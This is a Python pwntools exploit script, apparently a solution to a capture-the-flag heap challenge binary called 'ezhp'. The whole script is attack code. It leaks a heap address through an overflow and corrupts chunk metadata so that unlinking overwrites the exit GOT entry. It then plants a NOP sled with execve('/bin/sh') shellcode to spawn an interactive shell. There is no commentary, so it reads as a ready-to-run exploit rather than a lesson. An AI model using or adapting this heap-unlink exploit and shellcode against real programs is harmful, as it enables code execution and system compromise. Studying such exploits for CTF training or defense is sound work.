from pwn import *

p = process("./ezhp")
e = ELF("./ezhp")

shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

def leak():
    p.recvuntil("on.\n")
    p.sendline("3")

    p.recvuntil("id.\n")
    p.sendline("0")

    p.recvuntil("ze.\n")
    p.sendline("28")

    p.recvuntil("ta.\n")
    p.sendline("A"*28)

    p.recvuntil("on.\n")
    p.sendline("4")

    p.recvuntil("id.\n")
    p.sendline("0")

    return (u32(p.recvline()[28:32]) + 0xc)

def main():
    for i in range(0,3):
        p.recvuntil("on.\n")
        p.sendline("1")

        p.recvuntil("ze.\n")
        p.sendline("12")

    add_leak = leak()

    log.info("Leak : "+str(hex(add_leak)))

    p.recvuntil("on.\n")
    p.sendline("3")

    p.recvuntil("id.\n")
    p.sendline("0")

    p.recvuntil("ze.\n")
    p.sendline("36")

    payload = 'A'*28
    payload += p32(add_leak)
    payload += p32(e.got['exit'] - 0x4)

    p.recvuntil("ta.\n")
    p.sendline(payload)

    p.recvuntil("on.\n")
    p.sendline("2")

    p.recvuntil("id.\n")
    p.sendline("1")

    p.recvuntil("on.\n")
    p.sendline("3")

    p.recvuntil("id.\n")
    p.sendline("2")

    p.recvuntil("ze.\n")
    p.sendline("124")

    p.recvuntil("ta.\n")
    p.sendline("\x90"*100+shell+"\x00")

    p.recvuntil("on.\n")
    p.sendline("BBBBB")

    p.interactive()

if __name__ == "__main__":
    main()
